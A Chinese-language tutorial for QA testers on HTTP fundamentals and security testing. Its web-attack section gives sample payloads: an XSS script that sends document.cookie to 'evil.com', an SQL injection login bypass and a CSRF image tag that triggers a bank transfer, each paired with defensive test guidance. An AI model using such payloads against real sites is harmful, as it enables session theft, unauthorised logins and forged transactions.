---
tags: ['API 測試', '觀念', 'HTTP', '測試基礎']
---

# QA 必懂的 HTTP：你每天都在用，但未必說得清楚

你每天在 Postman 按 Send、看 status code 是不是 200、抓 response body 裡的欄位——這些動作背後，都是一個 HTTP 對話。

但如果有人問你「為什麼 GET 不能帶 body？」或「401 跟 403 差在哪？」，你能在三十秒內說清楚嗎？

這篇從 QA 的視角把 HTTP 的核心觀念講一遍。不是為了考試，是為了讓你在設計測試案例、分析缺陷、跟工程師溝通時，有更精確的語言。

## HTTP 是什麼：一問一答

HTTP（HyperText Transfer Protocol）是瀏覽器、App、API client 跟伺服器之間對話的規則。規則很簡單：

- 客戶端送一個 **Request（請求）**
- 伺服器回一個 **Response（回應）**
- 完。

每一次 API 呼叫都是這個結構。沒有例外。

## Request 的解剖

一個 HTTP request 長這樣：

```
POST /api/orders HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGci...

{
  "product_id": "SKU-001",
  "quantity": 2
}
```

拆開來看：

**第一行：方法 + 路徑 + 版本**

- `POST`：這次請求要做什麼事（動詞）
- `/api/orders`：對哪個資源操作（受詞）
- `HTTP/1.1`：用哪個版本的協議

**Headers（請求標頭）**

`Host`、`Content-Type`、`Authorization` 這些都是 header。Header 是這個請求的「元資訊」——它告訴伺服器「這個請求的內容是 JSON」、「這個用戶已登入」、「我可以接受哪種格式的回應」。

QA 測試時最常漏測的就是 header——正確 body 但錯誤 `Content-Type`、有效 token 但格式不對，這些都是真實的缺陷入口。

**Body（請求本體）**

實際要傳給伺服器的資料。GET 請求通常沒有 body（資料帶在 URL 的 query string）；POST、PUT 請求通常有 body。

## Response 的解剖

伺服器回來的訊息：

```
HTTP/1.1 201 Created
Content-Type: application/json
Location: /api/orders/9527

{
  "order_id": "9527",
  "status": "pending"
}
```

**第一行：版本 + 狀態碼 + 狀態文字**

`201 Created` 告訴你「成功了，而且建立了一個新資源」。

**Response Headers**

`Content-Type` 告訴 client 要怎麼解析 body；`Location` 告訴你新建立的資源在哪裡找。

測試時要記得驗證 response header，不只是 body。`Content-Type` 錯誤的 API 是真實存在的缺陷。

## 方法（Methods）：動詞決定語意

| 方法 | 語意 | 冪等？ | QA 測試重點 |
|------|------|--------|------------|
| GET | 讀取資源 | 是 | 不應有副作用；重複呼叫結果相同 |
| POST | 建立資源 | 否 | 重複送出會不會建立多筆？ |
| PUT | 整體更新（取代） | 是 | 缺少欄位會不會清空而非保留？ |
| PATCH | 部分更新 | 否 | 只送要改的欄位，其他欄位要保留 |
| DELETE | 刪除資源 | 是 | 刪除後再 GET 要回 404；重複 DELETE 怎麼處理？ |

**冪等（idempotent）** 的意思是：同樣的請求不管送幾次，結果都一樣。GET、PUT、DELETE 應該是冪等的；POST 不是——所以重試機制設計不好時，POST 很容易造成重複下單。

這個觀念直接影響 API 測試設計：對冪等的 endpoint，重複呼叫是一種邊界測試；對非冪等的 endpoint，網路重試是一個要驗證的風險。

## 狀態碼：QA 的分類地圖

狀態碼是伺服器告訴你「這次請求的結果」。QA 最需要掌握的不是全部記住，而是「哪個碼代表哪種情況、應該觸發什麼測試行為」。

**2xx：成功**

| 碼 | 意義 | 常見場景 |
|----|------|----------|
| 200 OK | 成功，有 body | GET 查詢、POST 操作後回資料 |
| 201 Created | 成功建立新資源 | POST 建立用戶、訂單 |
| 204 No Content | 成功，沒有 body | DELETE 成功、PUT 成功但不回資料 |

**3xx：重定向**

| 碼 | 意義 | 測試注意 |
|----|------|----------|
| 301 Moved Permanently | 永久搬到新 URL | client 應快取；下次直接打新 URL |
| 302 Found | 暫時搬到新 URL | client 不快取；每次都要重新找 |
| 304 Not Modified | 內容沒變，用快取 | 帶 `If-None-Match` / `If-Modified-Since` header 才會觸發 |

**4xx：客戶端錯誤**（請求有問題）

| 碼 | 意義 | 測試情境 |
|----|------|----------|
| 400 Bad Request | 請求格式或參數錯誤 | 少欄位、型態錯誤、格式不合 |
| 401 Unauthorized | 沒有認證 / 認證無效 | 沒帶 token、token 過期 |
| 403 Forbidden | 有認證但沒有權限 | 一般用戶存取管理員 API |
| 404 Not Found | 資源不存在 | 刪掉的資源、打錯 ID |
| 409 Conflict | 狀態衝突 | 重複建立、版本衝突 |
| 422 Unprocessable Entity | 格式對但語意錯 | 日期格式正確但是過去時間、金額為負數 |
| 429 Too Many Requests | 超過頻率限制 | Rate limit 測試 |

**401 vs 403 是最常混的一對**：401 是「我不知道你是誰」，403 是「我知道你是誰，但你沒有權限」。這兩個在權限測試設計時，觸發的測試案例完全不同。

**5xx：伺服器錯誤**（伺服器這邊出了問題）

| 碼 | 意義 | QA 注意 |
|----|------|---------|
| 500 Internal Server Error | 伺服器炸了 | 通常是 bug；要記錄能重現的步驟 |
| 502 Bad Gateway | 中間代理失敗 | 壓測、服務掛掉時常見 |
| 503 Service Unavailable | 服務暫時不可用 | 部署中、過載 |
| 504 Gateway Timeout | 代理等待超時 | 後端回應太慢 |

**5xx 是 bug，4xx 通常是測試案例**。當你在測試過程中看到 500，不要繼續往下——先把重現步驟記下來，這是一個需要修的缺陷。

## Headers：測試最常漏的地方

**認證類**

```
Authorization: Bearer <token>
Authorization: Basic <base64(user:pass)>
```

測試點：token 缺失、格式錯誤、過期、權限不足，每種都應該有對應的測試案例。

**內容類型**

```
Content-Type: application/json       # body 是 JSON
Content-Type: multipart/form-data    # 上傳檔案
Accept: application/json             # 我希望 server 回 JSON
```

測試點：送錯 `Content-Type` 時，API 應該回 400 還是還是嘗試解析？這個行為值得驗證。

**快取控制**

```
Cache-Control: no-cache       # 不要用快取
ETag: "abc123"                # 這個版本的識別碼
If-None-Match: "abc123"       # 如果還是這個版本就回 304
```

這對功能測試影響小，但在效能測試和 CDN 測試時是關鍵測試點。

**安全 Headers（常被忽略的測試點）**

```
Strict-Transport-Security: max-age=31536000    # 強制 HTTPS
X-Content-Type-Options: nosniff               # 防止 MIME 嗅探
X-Frame-Options: DENY                         # 防止被放進 iframe（防 Clickjacking）
Content-Security-Policy: default-src 'self'   # 限制資源來源（防 XSS）
```

安全測試時，這幾個 header 存不存在、設定是否正確，是基本的檢查點。

## 常見 Web 攻擊：QA 要測什麼

知道攻擊怎麼運作，才知道要設計什麼測試去找它。

**XSS（跨站腳本攻擊）**

攻擊者把惡意 JavaScript 注入頁面，讓其他用戶的瀏覽器執行。

```
// 攻擊者在輸入欄位送這個：
<script>document.location='http://evil.com?cookie='+document.cookie</script>
```

QA 測試方向：所有使用者可輸入、又會顯示在頁面上的欄位，都要驗證輸出有沒有被正確跳脫（`<` 變成 `&lt;`）。同時驗證 response header 有無 `Content-Security-Policy`。

**SQL Injection（SQL 注入）**

把 SQL 語法混進輸入值，操控後端的資料庫查詢。

```
// 攻擊者在帳號欄位輸入：
admin' --

// 如果後端 SQL 是這樣拼的：
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
// 密碼驗證被注釋掉，直接登入成功
```

QA 測試方向：登入欄位、搜尋欄位、任何會帶進資料庫查詢的輸入，都送單引號 `'`、`--`、`OR 1=1` 等，應該回 400 或空結果，不應該回意外資料或 500。

**CSRF（跨站請求偽造）**

攻擊者讓已登入的使用者，在不知情的情況下發出非本意的請求。

```
// 攻擊頁面上藏了這段：
<img src="https://bank.com/transfer?to=attacker&amount=10000">
// 用戶的瀏覽器會自動發出這個帶 cookie 的 GET 請求
```

QA 測試方向：
- 狀態改變的操作（轉帳、修改密碼、刪除資料）是否驗證 CSRF token？
- 驗 response header：`Set-Cookie` 是否有 `SameSite=Strict` 或 `SameSite=Lax`？

**Session 劫持**

攻擊者偷到 session ID，就能假裝成那個用戶。

QA 測試方向（驗 Cookie flags）：

```
// 正確的 Set-Cookie 應該長這樣：
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

// HttpOnly：JavaScript 無法存取（防 XSS 偷 cookie）
// Secure：只在 HTTPS 傳輸（防明文被截）
// SameSite：限制跨站帶 cookie（防 CSRF）
```

**一個實用的安全測試 checklist**

| 測試項目 | 測試方式 | 預期結果 |
|----------|----------|----------|
| XSS | 輸入欄送 `<script>alert(1)</script>` | 被跳脫，不執行 |
| SQL Injection | 輸入欄送 `' OR '1'='1` | 回 400 或空結果，不繞過 |
| CSRF | 不帶 CSRF token 發狀態改變請求 | 回 403 |
| Session Cookie | 看 `Set-Cookie` header | 有 `HttpOnly; Secure; SameSite` |
| Security Headers | 看 response headers | 有 `CSP`、`X-Frame-Options`、`X-Content-Type-Options` |

## HTTPS：夠用的理解

HTTP 是明文傳輸。HTTPS = HTTP + TLS，把傳輸內容加密。

對 QA 的實際意義：

1. **測試環境通常用 HTTP，生產環境用 HTTPS**——同樣的測試案例，在兩個環境跑出不同結果時，先確認協議是否一致。
2. **憑證錯誤會讓請求失敗**——測試時遇到 SSL 錯誤，先確認是測試環境的自簽憑證問題還是真的缺陷。
3. **混合內容（Mixed Content）**——HTTPS 頁面裡夾雜 HTTP 資源，瀏覽器會擋。這是前端測試要找的 bug。

## 這些怎麼影響你的測試設計

**邊界測試不只是「輸入邊界值」**

每個欄位有型態邊界（字串/數字/布林）、每個 header 有格式邊界、每個 method 有語意邊界。一個完整的 API 測試案例集，應該把 request 的每個組成部分都當成測試維度來設計。

**狀態碼是測試斷言，不只是觀察值**

不要只驗「有沒有回 200」。正確的斷言是：刪除後的 GET 要回 404、無效 token 要回 401、超出 rate limit 要回 429。這些都應該是明確的 expected result。

**缺陷描述要精確到 HTTP 層**

「登入會壞掉」不夠好。「POST /api/login 帶有效帳密，response 回 200，但 body 裡沒有 token 欄位」才是工程師能立刻定位的缺陷描述。

---

HTTP 不是只有後端工程師需要懂的東西。它是你做 API 測試、看懂 network log、分析缺陷、跟工程師溝通的基礎語言。把這篇讀完，下次在 Postman 按 Send 的時候，你會看到更多東西。
